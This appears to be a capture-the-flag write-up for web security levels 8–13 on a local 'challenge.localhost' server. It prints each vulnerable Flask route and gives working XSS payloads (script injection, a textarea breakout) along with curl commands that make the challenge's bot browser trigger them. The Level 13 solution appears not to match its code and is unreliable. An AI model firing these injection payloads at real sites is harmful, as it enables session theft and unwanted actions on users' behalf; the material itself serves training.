# Cross-Site Scripting (XSS) Vulnerabilities

## Level 8 - Exploit a cross site scripting vulnerability

Code for the level:

```python
def level8():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```



For this, the `/visit` path will run a browser in Selenium and redirect to the `url` parameter. If it gets an alert, it will display the flag.

To display an alert, we can use the `/echo` endpoint. I want it to display an alert, so I want to inject the `echo` arg as `<script>alert('XSS')</script>`. URL encoded, that is, `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`.

This gives a URL of `http://challenge.localhost/echo?echo=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`. Pasting this into the browser alerts, so we are on the right track.

I use this to build the `/visit` url and paste `http://challenge.localhost/visit?url=%20http%3A%2F%2Fchallenge.localhost%2Fecho%3Fecho%3D%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E` into the brower URL.

This worked, but I'd over-escaped the url. It can be simplified as `http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E` which is more readable.

While I used the browser because it was easier to test the alert, it also works with curl,

```sh
curl "http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E"
```

## Level 9 - Exploit a cross site scripting vulnerability with more complicated context

Code for this level,

```python
def level9():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(f"<textarea>{echo}</textarea>")

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```

The difference here is that the value that is echo'd is contained within a `<textarea>`, so the script won't be run. Unless of course we complete the `</textarea>`. I will send `</textarea><script>alert('XSS')</script><textarea>` to the echo, which encoded is, `%3C%2Ftextarea%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3Ctextarea%3E`.

```sh
curl "http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3Ctextarea%3E"
```

## Level 10 - Exploit a cross site scripting vulnerability to cause a user action

Code for this level,

```python
def level10():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404
```

First I want to call the `/visit` route which will trigger a login and then redirect to `/leak`

```sh
curl http://challenge.localhost/visit?url=http://challenge.localhost/leak?user=1
```

Then I call `/info` with the user id to get the flag,

```sh
curl http://challenge.localhost/info?user=1
```

## Level 13 - Exploit a cross site scripting vulnerability to exfiltrate user session data

Code for this level,

```python
def level13():
    app.config['SESSION_COOKIE_HTTPONLY'] = False

    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/info":
        session_user_id = int(session.get("user", -1))
        session_user = db.execute("SELECT * FROM users WHERE rowid = ?", (session_user_id,)).fetchone()

        request_user_id = int(request.args.get("user", session_user_id))
        request_user = db.execute("SELECT * FROM users WHERE rowid = ?", (request_user_id,)).fetchone()
        assert request_user, "Invalid `user`"

        info = [request_user["username"]]
        if request_user_id == session_user_id:
            info.append(request_user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404
```

This has a similar structure to [Level 11](./csrf.md#level-11---exploit-a-cross-site-request-forgery-vulnerability) and [Level 12](./csrf.md#level-12---exploit-a-cross-site-request-forgery-vulnerability-where-the-request-must-post).

In this case, the `/info` route will leak the flag if the user is logged in.

```sh
curl http://challenge.localhost/visit?url=http://challenge.localhost/info
```

and then get the flag with,

```sh
curl http://challenge.localhost/info?user=1
```
